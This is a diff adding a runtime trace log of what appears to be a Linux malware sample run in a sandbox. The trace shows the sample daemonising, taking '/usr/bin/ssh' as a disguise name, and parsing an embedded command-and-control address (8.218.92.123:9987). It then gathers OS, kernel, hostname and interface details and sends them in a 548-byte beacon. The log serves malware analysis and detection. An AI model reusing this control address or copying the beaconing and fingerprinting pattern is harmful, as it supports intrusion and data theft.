@@ -1,0 +1,223 @@
+85756 SYS_brk(0)                                                                    = 0x1407000
+85756 SYS_arch_prctl(0x3001, 0x7ffd7fecde70, 0x7fb0c08933c0, 1)                     = -22
+85756 SYS_mmap(0, 8192, 3, 34)                                                      = 0x7fb0c0872000
+85756 SYS_access("/etc/ld.so.preload", 04)                                          = -2
+85756 SYS_openat(0xffffff9c, 0x7fb0c08a221b, 0x80000, 0)                            = 3
+85756 SYS_newfstatat(3, 0x7fb0c08a2ee9, 0x7ffd7feccfc0, 4096)                       = 0
+85756 SYS_mmap(0, 0x12e9b, 1, 2)                                                    = 0x7fb0c085f000
+85756 SYS_close(3)                                                                  = 0
+85756 SYS_openat(0xffffff9c, 0x7fb0c0872140, 0x80000, 0)                            = 3
+85756 SYS_read(3, "\177ELF\002\001\001", 832)                                       = 832
+85756 SYS_newfstatat(3, 0x7fb0c08a2ee9, 0x7ffd7fecd090, 4096)                       = 0
+85756 SYS_mmap(0, 0x4028, 1, 2050)                                                  = 0x7fb0c085a000
+85756 SYS_mmap(0x7fb0c085b000, 4096, 5, 2066)                                       = 0x7fb0c085b000
+85756 SYS_mmap(0x7fb0c085c000, 4096, 1, 2066)                                       = 0x7fb0c085c000
+85756 SYS_mmap(0x7fb0c085d000, 8192, 3, 2066)                                       = 0x7fb0c085d000
+85756 SYS_close(3)                                                                  = 0
+85756 SYS_openat(0xffffff9c, 0x7fb0c0872660, 0x80000, 0)                            = 3
+85756 SYS_read(3, "\177ELF\002\001\001", 832)                                       = 832
+85756 SYS_newfstatat(3, 0x7fb0c08a2ee9, 0x7ffd7fecd070, 4096)                       = 0
+85756 SYS_mmap(0, 0x4038, 1, 2050)                                                  = 0x7fb0c0855000
+85756 SYS_mmap(0x7fb0c0856000, 4096, 5, 2066)                                       = 0x7fb0c0856000
+85756 SYS_mmap(0x7fb0c0857000, 4096, 1, 2066)                                       = 0x7fb0c0857000
+85756 SYS_mmap(0x7fb0c0858000, 8192, 3, 2066)                                       = 0x7fb0c0858000
+85756 SYS_close(3)                                                                  = 0
+85756 SYS_openat(0xffffff9c, 0x7fb0c0872b80, 0x80000, 0)                            = 3
+85756 SYS_read(3, "\177ELF\002\001\001", 832)                                       = 832
+85756 SYS_newfstatat(3, 0x7fb0c08a2ee9, 0x7ffd7fecd050, 4096)                       = 0
+85756 SYS_mmap(0, 0x4028, 1, 2050)                                                  = 0x7fb0c0850000
+85756 SYS_mmap(0x7fb0c0851000, 4096, 5, 2066)                                       = 0x7fb0c0851000
+85756 SYS_mmap(0x7fb0c0852000, 4096, 1, 2066)                                       = 0x7fb0c0852000
+85756 SYS_mmap(0x7fb0c0853000, 8192, 3, 2066)                                       = 0x7fb0c0853000
+85756 SYS_close(3)                                                                  = 0
+85756 SYS_openat(0xffffff9c, 0x7fb0c08730a0, 0x80000, 0)                            = 3
+85756 SYS_read(3, "\177ELF\002\001\001\003", 832)                                   = 832
+85756 SYS_pread(3, 0x7ffd7feccda0, 784, 64)                                         = 784
+85756 SYS_pread(3, 0x7ffd7feccd60, 48, 848)                                         = 48
+85756 SYS_pread(3, 0x7ffd7feccd10, 68, 896)                                         = 68
+85756 SYS_newfstatat(3, 0x7fb0c08a2ee9, 0x7ffd7fecd030, 4096)                       = 0
+85756 SYS_pread(3, 0x7ffd7feccc70, 784, 64)                                         = 784
+85756 SYS_mmap(0, 0x228e50, 1, 2050)                                                = 0x7fb0c0627000
+85756 SYS_mprotect(0x7fb0c064f000, 2023424, 0)                                      = 0
+85756 SYS_mmap(0x7fb0c064f000, 0x195000, 5, 2066)                                   = 0x7fb0c064f000
+85756 SYS_mmap(0x7fb0c07e4000, 0x58000, 1, 2066)                                    = 0x7fb0c07e4000
+85756 SYS_mmap(0x7fb0c083d000, 0x6000, 3, 2066)                                     = 0x7fb0c083d000
+85756 SYS_mmap(0x7fb0c0843000, 0xce50, 3, 50)                                       = 0x7fb0c0843000
+85756 SYS_close(3)                                                                  = 0
+85756 SYS_mmap(0, 8192, 3, 34)                                                      = 0x7fb0c0625000
+85756 SYS_arch_prctl(4098, 0x7fb0c0625b80, 0xffff804f3f9d9aa0, 1)                   = 0
+85756 SYS_set_tid_address(0x7fb0c0625e50, 0x7fb0c0625b80, 0x7fb0c08af0d8, 1)        = 0x14efc
+85756 SYS_set_robust_list(0x7fb0c0625e60, 24, 0x7fb0c08af0d8, 1)                    = 0
+85756 SYS_334(0x7fb0c0626520, 32, 0, 0x53053053)                                    = 0
+85756 SYS_mprotect(0x7fb0c083d000, 16384, 1)                                        = 0
+85756 SYS_mprotect(0x7fb0c0853000, 4096, 1)                                         = 0
+85756 SYS_mprotect(0x7fb0c0858000, 4096, 1)                                         = 0
+85756 SYS_mprotect(0x7fb0c085d000, 4096, 1)                                         = 0
+85756 SYS_mprotect(0x7fb0c08ac000, 8192, 1)                                         = 0
+85756 SYS_prlimit64(0, 3, 0, 0x7ffd7fecdbd0)                                        = 0
+85756 SYS_munmap(0x7fb0c085f000, 77467)                                             = 0
+85756 __libc_start_main(0x404957, 1, 0x7ffd7fece038, 0x40d670 <unfinished ...>
+85756 daemon(0, 0, 0x7ffd7fece048, 0x40d670 <unfinished ...>
+85756 SYS_clone(0x1200011, 0, 0, 0x7fb0c0625e50)                                    = 0x14efd
+85757 SYS_set_robust_list(0x7fb0c0625e60, 24, 0, 0x7fb0c0625e50 <unfinished ...>
+85756 SYS_exit_group(0 <unfinished ...>
+85757 <... SYS_set_robust_list resumed> )                                           = 0
+85756 +++ exited (status 0) +++
+85757 SYS_setsid(1)                                                                 = 85757
+85757 SYS_chdir("/")                                                                = 0
+85757 SYS_openat(0xffffff9c, 0x7fb0c07fefc7, 2, 0)                                  = 3
+85757 SYS_newfstatat(3, 0x7fb0c07ff44f, 0x7ffd7fecd450, 4096)                       = 0
+85757 SYS_dup2(3, 0)                                                                = 0
+85757 SYS_dup2(3, 1)                                                                = 1
+85757 SYS_dup2(3, 2)                                                                = 2
+85757 SYS_close(3)                                                                  = 0
+85757 <... daemon resumed> )                                                        = 0
+85757 memcpy(0x7ffd7fecd2e2, "U<_\377\354\212R\3116\310\331\002", 12)               = 0x7ffd7fecd2e2
+85757 strcpy(0x7ffd7fecd3e0, "/usr/bin/ssh")                                        = 0x7ffd7fecd3e0
+85757 memset(0x7ffd7fecf47a, '\0', 13)                                              = 0x7ffd7fecf47a
+85757 strcpy(0x7ffd7fecf47a, "/usr/bin/ssh")                                        = 0x7ffd7fecf47a
+85757 memcpy(0x7ffd7fecd190, "8.218.92.123:9987;|1;1;1;1;1;1;1"..., 42)             = 0x7ffd7fecd190
+85757 strstr("8.218.92.123:9987;|1;1;1;1;1;1;1"..., "|")                            = "|1;1;1;1;1;1;1;|00-24;|1"
+85757 strstr("1;1;1;1;1;1;1;|00-24;|1", "|")                                        = "|00-24;|1"
+85757 strstr("00-24;|1", "|")                                                       = "|1"
+85757 memcpy(0x7ffd7fecce70, "8.218.92.123:9987;", 18)                              = 0x7ffd7fecce70
+85757 strtol(0x7ffd7fecce7d, 0, 10, 18)                                             = 9987
+85757 memcpy(0x7ffd7fecd514, "8.218.92.123", 12)                                    = 0x7ffd7fecd514
+85757 memcpy(0x7ffd7fecce70, "1;1;1;1;1;1;1;", 14)                                  = 0x7ffd7fecce70
+85757 memcpy(0x7ffd7fecce70, "00-24;", 6)                                           = 0x7ffd7fecce70
+85757 strstr("00-24;", "-")                                                         = "-24;"
+85757 strtol(0x7ffd7fecce73, 0, 10, 6)                                              = 24
+85757 strtol(0x7ffd7fecce70, 0, 10, 6)                                              = 0
+85757 strtol(0x7ffd7fecd1b9, 0, 10, 1)                                              = 1
+85757 pthread_mutex_init(0x7ffd7fecdd53, 0, 1, 0x7ffd7fecd1ba)                      = 0
+85757 time(0)                                                                       = 1732914185
+85757 localtime(0x7ffd7fecd4b8 <unfinished ...>
+85757 SYS_318(0x7fb0c08484d8, 8, 1, 0x7fb0c062d8a0)                                 = 8
+85757 SYS_brk(0)                                                                    = 0x1407000
+85757 SYS_brk(0x1428000)                                                            = 0x1428000
+85757 SYS_openat(0xffffff9c, 0x7fb0c0800b02, 0x80000, 0)                            = 3
+85757 SYS_newfstatat(3, 0x7fb0c07ff44f, 0x7ffd7fecd350, 4096)                       = 0
+85757 SYS_newfstatat(3, 0x7fb0c07ff44f, 0x7ffd7fecd170, 4096)                       = 0
+85757 SYS_read(3, "TZif2", 4096)                                                    = 3664
+85757 SYS_lseek(3, -2329, 1)                                                        = 1335
+85757 SYS_read(3, "TZif2", 4096)                                                    = 2329
+85757 SYS_close(3)                                                                  = 0
+85757 <... localtime resumed> )                                                     = 0x7fb0c08486a0
+85757 time(0)                                                                       = 1732914185
+85757 localtime(0x7ffd7fecd488 <unfinished ...>
+85757 SYS_newfstatat(0xffffff9c, 0x7fb0c0800b02, 0x7ffd7fecd040, 0)                 = 0
+85757 <... localtime resumed> )                                                     = 0x7fb0c08486a0
+85757 fopen("/usr/include/sdfwex.h", "rb" <unfinished ...>
+85757 SYS_openat(0xffffff9c, 0x7ffd7fecd470, 0, 0)                                  = -2
+85757 <... fopen resumed> )                                                         = 0
+85757 fopen("/tmp/.llock", "rb" <unfinished ...>
+85757 SYS_openat(0xffffff9c, 0x7ffd7fecd460, 0, 0)                                  = -2
+85757 <... fopen resumed> )                                                         = 0
+85757 socket(2, 1, 6 <unfinished ...>
+85757 SYS_socket(2, 1, 6, 0x7fb0c0630c30)                                           = 3
+85757 <... socket resumed> )                                                        = 3
+85757 gethostbyname("8.218.92.123" <unfinished ...>
+85757 SYS_newfstatat(0xffffff9c, 0x7fb0c0802f5d, 0x7ffd7fecd240, 0)                 = 0
+85757 SYS_openat(0xffffff9c, 0x7fb0c0802eb6, 0x80000, 0)                            = 4
+85757 SYS_newfstatat(4, 0x7fb0c07ff44f, 0x7ffd7fecccb0, 4096)                       = 0
+85757 SYS_read(4, "# The "order" line is only used "..., 4096)                      = 92
+85757 SYS_read(4, "", 4096)                                                         = 0
+85757 SYS_close(4)                                                                  = 0
+85757 SYS_futex(0x7fb0c084a32c, 129, 0x7fffffff, 0)                                 = 0
+85757 SYS_openat(0xffffff9c, 0x7fb0c0802f5d, 0x80000, 0)                            = 4
+85757 SYS_newfstatat(4, 0x7fb0c07ff44f, 0x7ffd7fecced0, 4096)                       = 0
+85757 SYS_read(4, "# This is /run/systemd/resolve/s"..., 4096)                      = 920
+85757 SYS_read(4, "", 4096)                                                         = 0
+85757 SYS_newfstatat(4, 0x7fb0c07ff44f, 0x7ffd7feccfb0, 4096)                       = 0
+85757 SYS_close(4)                                                                  = 0
+85757 <... gethostbyname resumed> )                                                 = 0x7fb0c0849a40
+85757 memcpy(0x7ffd7fecd454, "\b\332\\{", 4)                                        = 0x7ffd7fecd454
+85757 connect(3, 0x7ffd7fecd450, 16, 0x7b5cda08 <unfinished ...>
+85757 SYS_connect(3, 0x7ffd7fecd450, 16, 0x7fb0c062e5c0)                            = 0
+85757 <... connect resumed> )                                                       = 0
+85757 setsockopt(3, 1, 20, 0x7ffd7fecd488 <unfinished ...>
+85757 SYS_setsockopt(3, 1, 20, 0x7ffd7fecd488)                                      = -22
+85757 <... setsockopt resumed> )                                                    = 0xffffffff
+85757 setsockopt(3, 1, 21, 0x7ffd7fecd488 <unfinished ...>
+85757 SYS_setsockopt(3, 1, 21, 0x7ffd7fecd488)                                      = -22
+85757 <... setsockopt resumed> )                                                    = 0xffffffff
+85757 fopen("/etc/issue.net", "rb" <unfinished ...>
+85757 SYS_openat(0xffffff9c, 0x7ffd7feca7d0, 0, 0)                                  = 4
+85757 <... fopen resumed> )                                                         = 0x14072c0
+85757 fgets( <unfinished ...>
+85757 SYS_newfstatat(4, 0x7fb0c07ff44f, 0x7ffd7feca590, 4096)                       = 0
+85757 SYS_read(4, "Ubuntu 22.04.5 LTS\n", 4096)                                     = 19
+85757 <... fgets resumed> "Ubuntu 22.04.5 LTS\n", 200, 0x14072c0)                   = 0x7ffd7feca8b0
+85757 fclose(0x14072c0 <unfinished ...>
+85757 SYS_close(4)                                                                  = 0
+85757 <... fclose resumed> )                                                        = 0
+85757 strcpy(0x7ffd7fecd250, "Ubuntu 22.04.5 LTS")                                  = 0x7ffd7fecd250
+85757 fopen("/proc/version", "rb" <unfinished ...>
+85757 SYS_openat(0xffffff9c, 0x7ffd7feca7b0, 0, 0)                                  = 4
+85757 <... fopen resumed> )                                                         = 0x14072c0
+85757 fgets( <unfinished ...>
+85757 SYS_newfstatat(4, 0x7fb0c07ff44f, 0x7ffd7feca590, 4096)                       = 0
+85757 SYS_read(4, "Linux version 5.15.0-27-generic "..., 1024)                      = 170
+85757 <... fgets resumed> "Linux version 5.15.0-27-generic "..., 200, 0x14072c0)    = 0x7ffd7feca7e0
+85757 fclose(0x14072c0 <unfinished ...>
+85757 SYS_close(4)                                                                  = 0
+85757 <... fclose resumed> )                                                        = 0
+85757 strstr("Linux version 5.15.0-27-generic "..., "x86_64")                       = nil
+85757 gethostname( <unfinished ...>
+85757 SYS_uname(0x7ffd7feca5b0)                                                     = 0
+85757 <... gethostname resumed> "malware", 256)                                     = 0
+85757 getifaddrs(0x7ffd7feca778, 0x7ffd7feca5f7, 8, 0 <unfinished ...>
+85757 SYS_socket(16, 0x80003, 0, 0x7fb0c063b880)                                    = 4
+85757 SYS_bind(4, 0x7ffd7feca65c, 12, 0x7fb0c063b880)                               = 0
+85757 SYS_getsockname(4, 0x7ffd7feca65c, 0x7ffd7feca658, 0x7fb0c063b880)            = 0
+85757 SYS_sendto(4, 0x7ffd7feca630, 20, 0)                                          = 20
+85757 SYS_recvmsg(4, 0x7ffd7feca5f0, 0, 0)                                          = 2740
+85757 SYS_recvmsg(4, 0x7ffd7feca5f0, 0, 0x7fb0c0842120)                             = 20
+85757 SYS_sendto(4, 0x7ffd7feca630, 20, 0)                                          = 20
+85757 SYS_recvmsg(4, 0x7ffd7feca5f0, 0, 0)                                          = 152
+85757 SYS_recvmsg(4, 0x7ffd7feca5f0, 0, 0x14084a0)                                  = 72
+85757 SYS_recvmsg(4, 0x7ffd7feca5f0, 0, 0x14084a0)                                  = 20
+85757 SYS_close(4)                                                                  = 0
+85757 <... getifaddrs resumed> )                                                    = 0
+85757 pthread_mutex_lock(0x7ffd7fecdd53, 0, 745, 0x7ffd7fecd510)                    = 0
+85757 memset(0x7ffd7fec8140, '\0', 10241)                                           = 0x7ffd7fec8140
+85757 memcpy(0x7ffd7fec815c, "Ubuntu 22.04.5 LTS\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 520) = 0x7ffd7fec815c
+85757 clock_gettime(1, 0x7ffd7fec8000, 0x7ffd7fec8324, 0x7ffd7fec815c)              = 0
+85757 clock_gettime(1, 0x7ffd7fec8000, 0x109dc52, 0x2fd5)                           = 0
+85757 clock_gettime(1, 0x7ffd7fec8000, 0x10970ee, 0x9b39)                           = 0
+85757 clock_gettime(1, 0x7ffd7fec8000, 0x109efd2, 7253)                             = 0
+85757 sprintf("30", "%02x", 0x30)                                                   = 2
+85757 sprintf("9E", "%02X", 0x9e)                                                   = 2
+85757 sprintf("0e", "%02x", 0xe)                                                    = 2
+85757 sprintf("34", "%02X", 0x34)                                                   = 2
+85757 sprintf("0a", "%02x", 0xa)                                                    = 2
+85757 sprintf("78", "%02X", 0x78)                                                   = 2
+85757 sprintf("01", "%02x", 0x1)                                                    = 2
+85757 sprintf("8C", "%02X", 0x8c)                                                   = 2
+85757 sprintf("31", "%02X", 0x31)                                                   = 2
+85757 sprintf("92", "%02x", 0x92)                                                   = 2
+85757 sprintf("2F", "%02X", 0x2f)                                                   = 2
+85757 sprintf("F7", "%02X", 0xf7)                                                   = 2
+85757 sprintf("19", "%02x", 0x19)                                                   = 2
+85757 sprintf("34", "%02X", 0x34)                                                   = 2
+85757 sprintf("33", "%02X", 0x33)                                                   = 2
+85757 sprintf("89", "%02x", 0x89)                                                   = 2
+85757 sprintf("71", "%02X", 0x71)                                                   = 2
+85757 sprintf("AF", "%02X", 0xaf)                                                   = 2
+85757 sprintf("8d", "%02x", 0x8d)                                                   = 2
+85757 sprintf("EB", "%02X", 0xeb)                                                   = 2
+85757 send(3, 0x7ffd7fec8140, 548, 0 <unfinished ...>
+85757 SYS_sendto(3, 0x7ffd7fec8140, 548, 0)                                         = 548
+85757 <... send resumed> )                                                          = 548
+85757 pthread_mutex_unlock(0x7ffd7fecdd53, 0, 549, 0x7fb0c074e8b0)                  = 0
+85757 select(4, 0x7ffd7fecd1b0, 0, 0 <unfinished ...>
+85757 SYS_pselect6(4, 0x7ffd7fecd1b0, 0, 0)                                         = 0
+85757 <... select resumed> )                                                        = 0
+85757 close(3 <unfinished ...>
+85757 SYS_close(3)                                                                  = 0
+85757 <... close resumed> )                                                         = 0
+85757 clock_gettime(1, 0x7ffd7feca970, 0x13880, 0xaaaaaaab)                         = 0
+85757 usleep(55694000 <unfinished ...>
+85757 SYS_clock_nanosleep(0, 0, 0x7ffd7feca950, 0 <no return ...>
+85757 +++ killed by SIGKILL +++
+
